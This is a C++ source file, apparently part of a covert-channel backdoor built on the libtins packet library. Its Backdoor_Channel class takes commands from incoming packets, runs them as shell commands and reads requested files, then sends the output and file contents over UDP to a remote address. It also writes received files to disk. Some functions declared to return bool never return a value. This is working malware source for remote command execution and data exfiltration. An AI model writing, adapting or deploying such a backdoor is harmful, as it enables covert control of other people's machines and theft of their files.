#include "backdoor_channel.h"
#include "utilities.h"

#include <tins/tins.h>
#include <iostream>
#include <string>

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

void Backdoor_Channel::start(string interface, int listen_port, int target_port, string target_ip) {

    config.interface = interface;
    config.listen_port = listen_port;
    config.target_addr.ip = target_ip;
    config.target_addr.port = target_port;

    cout << "Start covert channel. " << endl;
    cout << "\t" << " config.interface: "  << config.interface << endl;
    cout << "\t" << " config.listen_port: "  << config.listen_port << endl;
    cout << "\t" << " config.target_addr.port: "  << config.target_addr.port << endl;
    //detach a thread then return to gui
    setup();
}

bool Backdoor_Channel::parse_command(Job& j){
    cout << "parse_command " << j.command << endl;
    CMD cmd;
    try{
        cmd = cmdMap.right.find(j.command)->second;
    }
    catch(...){
        cout << "parse_command [failed] " << endl;
        return false;
    }


    switch(cmd) {
        case CMD::run_command :
            handle_run_cmd(j);
            break; //optional
        case CMD::return_file :
            handle_return_file(j);
            break; //optional
        case CMD::get_file :
            handle_get_file(j);
            break; //optional
        default :
            cout << "parse_command default switch case " << endl;
            return false;
    }
    return true;
}

bool Backdoor_Channel::handle_get_file(Job& j){
    string result, response;
    std::vector<unsigned char> hidden_data;
    cout << "ReadFile: " << '"' << j.argument << '"' << endl;
    Utilities::readfile(j.argument, hidden_data);
    response += '[';
    response += cmdMap.left.find(CMD::return_file)->second;
    response += ']';
    response += '[';
    response += j.argument;
    response += ']';

    int i =0;
    for(auto& c : response){
        hidden_data.insert(hidden_data.begin()+i, c);
        i++;
    }

    cout << "response: \n" << response << endl;
    cout << "ip: \n" << j.address.ip << "port:" << config.target_addr.port << endl;
    udp_send(j.address.ip, config.target_addr.port, hidden_data);
    return true;
}

bool Backdoor_Channel::handle_run_cmd(Job& j){
    string result, response;
    result = Utilities::execute(j.argument);
    response += '[';
    response += cmdMap.left.find(CMD::return_command)->second;
    response += ']';
    response += result;
    cout << "response: \n" << response << endl;
    cout << "ip: \n" << j.address.ip << "port:" << config.target_addr.port << endl;
    udp_send(j.address.ip, config.target_addr.port, std::vector<unsigned char>(response.begin(), response.end()));
    return true;
}

bool Backdoor_Channel::handle_return_file(Job& j){
    split_command_argument_with_regex(j.argument, j);
    Utilities::writefile(j.command, j.argument);
}


bool Backdoor_Channel::callback_sendfile(string filepath){
    Job j;
    j.address = config.target_addr;
    j.argument = filepath;
    handle_get_file(j);
}

bool Backdoor_Channel::callback_sendNewFile(string filepath, string data){
    Job j;
    j.job = std::vector<unsigned char>(data.begin(), data.end());
    j.address = config.target_addr;
    j.argument = filepath;
    handle_get_file(j);
}